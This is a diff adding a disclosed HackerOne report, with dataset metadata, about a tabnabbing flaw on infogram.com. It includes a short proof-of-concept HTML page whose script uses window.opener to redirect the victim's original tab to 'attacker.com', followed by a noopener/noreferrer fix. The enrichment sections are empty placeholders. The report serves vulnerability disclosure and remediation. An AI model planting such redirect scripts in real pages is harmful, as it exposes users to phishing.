@@ -1,0 +1,97 @@
+---
+source: hackerone
+dataset: elamaran619/hackerone_disclosed_reports
+h1_id: '280500'
+original_report_id: '280500'
+title: Tabnabbing via window.opener
+weakness: Violation of Secure Design Principles
+team_handle: infogram
+created_at: '2017-10-19T13:35:13.660Z'
+disclosed_at: '2017-11-06T09:04:32.241Z'
+has_bounty: false
+visibility: full
+substate: resolved
+vote_count: 6
+asset_identifier: infogram.com
+asset_type: URL
+max_severity: critical
+tags:
+- hackerone
+- violation-of-secure-design-principles
+---
+
+# Tabnabbing via window.opener
+
+## Metadata
+
+- HackerOne Report ID: 280500
+- Weakness: Violation of Secure Design Principles
+- Program: infogram
+- Disclosed At: 2017-11-06T09:04:32.241Z
+- Has Bounty: No
+- Visibility: full
+- Substate: resolved
+
+## Original Report
+
+Hi Team, i would like to report tab nabbing issue on your domain.
+
+#Details:
+
+When you open a link in a new tab ( target="_blank" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.
+
+#PoC:
+
+1.Navigate to ```https://infogram.com/app/[userproject]```.
+2. Provide any url as evil url. http://test.com/test.html test.html contains following code.
+
+```
+<html>
+<script>
+if (window.opener) window.opener.parent.location.replace('http://attacker.com');
+if (window.parent != window) window.parent.location.replace('http://attacker.com');
+</script>
+blah
+</html>
+```
+Also check Open link in new tab
+
+The javascript code that does all the magic: 
+```window.opener.location.replace(newURL);```
+my link will open in new tab and original tab will be replaced with attacker malicious link.
+
+#Fix:
+
+In order to mitigate this issue, developers are encouraged to use rel="nofollow noopener noreferrer" as follows:
+
+```
+<a target="_blank" class="btn external-url" href="https://evil.com" rel="nofollow noopener noreferrer"><i class="fa fa-external-link"></i>
+</a>
+```
+
+Let me know if u have problems in reproducing the issue.
+
+Regards,
+Mr.R3boot.
+
+## Extracted Security Notes
+
+### Likely Vulnerability Class
+
+*Leave this section for future enrichment.*
+
+### Likely Root Cause
+
+*Leave this section for future enrichment.*
+
+### Potential Impact
+
+*Leave this section for future enrichment.*
+
+### Defensive Test Cases
+
+*Leave this section for future enrichment.*
+
+### Remediation Ideas
+
+*Leave this section for future enrichment.*
